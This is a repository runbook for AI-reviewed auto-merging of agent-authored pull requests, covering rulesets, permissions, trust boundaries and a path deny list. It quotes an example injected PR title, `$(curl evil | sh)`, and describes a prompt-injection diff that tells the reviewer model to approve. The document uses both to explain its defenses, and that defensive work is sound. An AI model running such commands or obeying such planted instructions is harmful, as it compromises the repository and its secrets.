# Auto-merge for `agent/*` pull requests (W13)

This is the owner checklist for `.github/workflows/agent-review.yml` and
`.github/workflows/agent-automerge.yml`. Read this before setting
`AUTO_MERGE_ENABLED=true`.

## Why this stays off by default

The repo is **private on GitHub Free**. Branch protection / rulesets on
`main` are a GitHub Pro (or Team/Enterprise) feature -- the API returns
"Upgrade to GitHub Pro" for this repo today. Without a ruleset:

- Nothing stops a direct `git push` to `main` by anyone with write access.
- Nothing stops a manual merge from the GitHub UI that skips CI or the
  `Agent review` check.
- `agent-automerge.yml`'s `gh pr merge --squash --auto` is a **safety net for
  one specific path** (an agent's own PR going through its own workflow),
  not an enforced gate. It only runs the checks the workflow itself asks for.

`AUTO_MERGE_ENABLED` therefore defaults to unset (off). Turn it on only after
buying GitHub Pro and creating the ruleset below -- at that point the
workflow's gate and the platform's ruleset back each other up, which is the
actual safety property this was built for.

## Checklist to go live

1. **Buy GitHub Pro** for the account/org that owns this repo (private repos
   need Pro or higher for rulesets/branch protection).
2. **Create a ruleset on `main`** (Settings -> Rules -> Rulesets -> New
   branch ruleset):
   - Target branch: `main`.
   - Require a pull request before merging.
   - Require status checks to pass: `ci` (the CI workflow's job names -- at
     minimum `ruff`, `pytest`, `gitleaks`) **and** `Agent review`.
   - Block force pushes.
   - Do not allow bypass (no "Repository admin" bypass list entry) -- a
     bypass entry defeats the point of the ruleset for exactly the actors
     most likely to be operating unattended.
3. **Enable "Allow auto-merge"** in repo settings (Settings -> General ->
   Pull Requests -> Allow auto-merge). `gh pr merge --auto` requires this to
   be on at the repo level even when the workflow's own gate already passed.
4. **Create the `needs-human` label** (Settings -> Labels), alongside the
   existing `agent` / `agent-pr-open` labels from W10.
5. **Set repo variables** (Settings -> Secrets and variables -> Actions ->
   Variables):
   - `AGENT_REVIEW_MODEL` -- an OpenRouter model id for the reviewer. **Must
     differ from the executor model** (`AGENT_OPENCODE_MODEL` /
     `deepseek/deepseek-v4.1-flash`) -- reviewing a PR with the same model
     that wrote it defeats the point of a second opinion. `review_gate.py`
     reads this with no default and fails closed (posts a `request_changes`
     verdict, sets the `agent-review` status to `failure`) if it is unset.
   - `AUTO_MERGE_ENABLED=true` -- only once steps 1-4 are done.
   - `AGENT_AUTOMERGE_MAX_DIFF_BYTES` -- optional, default `60000`.
   - `AGENT_DAILY_BUDGET_USD` -- optional, default `2`. See "Cost guard"
     below for what this can and can't actually enforce.
6. **Set the repo secret** `OPENROUTER_AGENT_KEY` if it isn't already set
   from W10 (same dedicated, capped key `agent-task.yml` uses -- never the
   product's main key).
7. Run one real agent PR end to end with `AUTO_MERGE_ENABLED` still **off**
   first, and confirm the `agent-review` comment + commit status look right,
   before flipping it on.

## Require the Agent review check

Add the visible **`Agent review`** job check to the `main-protection`
ruleset's required checks. It runs for `agent/*` PRs and for `issue-<n>` PRs
opened by an actor in `AGENT_ALLOWED_ACTORS` (default `mahan-films`); other
branches show it as skipped. The check succeeds only for an `approve`,
low-risk verdict. A rejection or high-risk verdict fails it, so auto-merge
waits; the hub should read the review comment on that PR before deciding what
to do next. The separate lowercase `agent-review` commit status remains the
input used by `agent-automerge.yml`.

## How the gate works

**Neither workflow ever checks out or executes anything from a PR's head.**
Both jobs check out only `main` (the default branch), so `review_gate.py`,
`automerge_gate.py` and `cost_ledger.py` are always the trusted, reviewed
copies -- never a version an agent's own PR (or a prompt-injected diff)
could have modified to self-approve or exfiltrate `OPENROUTER_AGENT_KEY`.
The diff itself is fetched read-only via `gh pr diff` (an API call, not a
checkout) and sent to the reviewer model as inert text. Every value that
originates from the PR (title, body) or a step output is passed through a
step's `env:` and referenced as a shell variable, never interpolated
directly into a `run:` script -- a PR titled `` $(curl evil | sh) `` must
not run anything.

**Trigger note:** a PR opened by `agent-task.yml` is authored with the
built-in `GITHUB_TOKEN`, and GitHub does not fire `pull_request` events for
a `GITHUB_TOKEN`-authored PR (the same anti-recursion rule `ci.yml` already
works around). `agent-review.yml` is therefore triggered by
`workflow_dispatch` (input `pr_number`), which `agent-task.yml` calls right
after opening a PR -- the same pattern it already uses to dispatch `ci.yml`.
It also uses `pull_request_target` for `agent/*` PRs and trusted rx
`issue-<n>` PRs; that event evaluates the workflow from the target branch,
not the PR head. `agent-automerge.yml` has **no** `pull_request` trigger at
all -- only `workflow_run` (reacting to `Agent review`/`CI`
completing, always evaluated using the workflow file on `main`, never the
PR's own copy) and an optional `workflow_dispatch` for a manual re-check.

`agent-review.yml`:

1. Resolves the PR (number, branch, head/base sha, title, body) via `gh pr
   view`, from whichever trigger supplied the PR number.
2. Fetches the diff against the PR's base commit via `gh pr diff`.
3. Waits for `ci.yml`'s conclusion on that commit.
4. Sends the diff + CI status to `AGENT_REVIEW_MODEL` via OpenRouter, with
   the diff explicitly framed as **untrusted input** (a coding agent's diff
   can contain a prompt-injection attempt, e.g. a comment telling the
   reviewer to approve regardless of content -- the reviewer prompt tells the
   model to treat that as data to flag, not an instruction to follow). See
   `output_apps/ecosystem_core/src/factory/review_gate.py`.
5. Posts the verdict (`approve`/`request_changes`, `risk`, `reasons`) as a PR
   comment, sets the legacy commit status named `agent-review`, and completes
   the visible `Agent review` job check successfully only for `approve` with
   `low` risk.

`agent-automerge.yml` runs only when `AUTO_MERGE_ENABLED == 'true'`, and
merges (`gh pr merge --squash --auto`) only when **all** of these hold
(`output_apps/ecosystem_core/src/factory/automerge_gate.py::decide`):

- Branch starts with `agent/`.
- **PR author is exactly `github-actions[bot]`** -- not any human login.
  Agent PRs are opened with the built-in `GITHUB_TOKEN`, which GitHub
  attributes to this app account; a PR a human opened directly, even from an
  `agent/*` branch, never auto-merges. The head commit's own author (a
  cheap, best-effort provenance check) is checked the same way when
  available.
- CI concluded `success`.
- The `agent-review` commit status was itself posted by `github-actions[bot]`
  -- a status posted by any other identity is ignored (treated as "no
  review"), so a compromised or malicious status can't fake an approval --
  **and** its verdict is `approve` **and** risk is `low`.
- Diff is at or under `AGENT_AUTOMERGE_MAX_DIFF_BYTES`.
- No changed path matches the deny list: auth (`*auth*`, `*_auth*`), payments
  (`zibal`, `*/payment/*`), secrets (`.env`, `.env.*`), `.github/**`,
  `docker-compose*.{yml,yaml}`, `*nginx*.conf`, `*.service`,
  `config/models.yaml`, `scripts/ops/**`, `**/migrations/**`.

Any failing condition labels the PR `needs-human` and comments why, instead
of merging. `agent-automerge.yml`'s job has `contents: write` (needed for
`gh pr merge` to push the squash-merge commit) -- every other permission on
both workflows stays at the minimum needed (`contents: read`,
`pull-requests: write`, `statuses: write`, `actions: read`, as applicable).

**Known limitation:** `agent-automerge.yml` re-derives the `agent-review`
verdict/risk from the commit status's `description` text
(`verdict=... risk=...`), not a structured, persisted artifact -- GitHub
Actions gives no cross-run storage without adding external state, and the
commit status is the one place both workflows can read/write without one.
This is functional but a bit fragile; a follow-up could move to a small
persisted artifact or a repo-scoped check-run output instead.

## Cost guard

Every ephemeral GitHub Actions runner starts empty, so a per-workflow-run
JSONL ledger (`output_apps/ecosystem_core/src/factory/cost_ledger.py`) is a
same-run sanity check only, not a cross-run daily budget -- it cannot see
what other runs spent today. The **real** daily cap is the
`OPENROUTER_AGENT_KEY`'s own `limit` with `limit_reset: daily` (set via the
OpenRouter dashboard or the Provisioning API), exactly as documented for
`agent-task.yml` in `docs/AGENTS_WORKFORCE.md` #6.

`agent-review.yml` additionally calls `cost_ledger.check_daily_budget()`
before spending anything: a cheap, read-only `GET /api/v1/key` call. When the
key reports a daily-scoped `limit_remaining`, the workflow skips (posts a
"skipped: daily budget guard" comment, sets `agent-review` to `pending`)
once that's exhausted -- a real, if same-run, enforcement. When the key has
no daily `limit_reset` configured, this check cannot tell "today's spend"
from "all-time spend" and does **not** block (a false positive here would
silently stop every future review) -- it only documents that the key's own
`limit_reset` is the real guard. Set `limit_reset: daily` on the key to get
the stronger behavior.

`scripts/cost_report.py` aggregates whatever ledger files you point it at
(the product router's usage log, an agent-task ledger, an agent-review
ledger) into a daily/weekly summary, in English or Persian
(`--lang fa`). It is a local/offline reporting tool -- it does not fetch
anything cross-run on its own, since GitHub Actions doesn't give a workflow
a persistent place to write one without adding external storage.

## How to turn auto-merge off

Set the repo variable `AUTO_MERGE_ENABLED` to `false` or delete it. The
workflow's own `if:` guard (`vars.AUTO_MERGE_ENABLED == 'true'`) means the
job is entirely skipped, not merely gated at decision time -- no gate logic
runs at all. `agent-review.yml` is independent and keeps running either way
(it posts a verdict; it never merges).
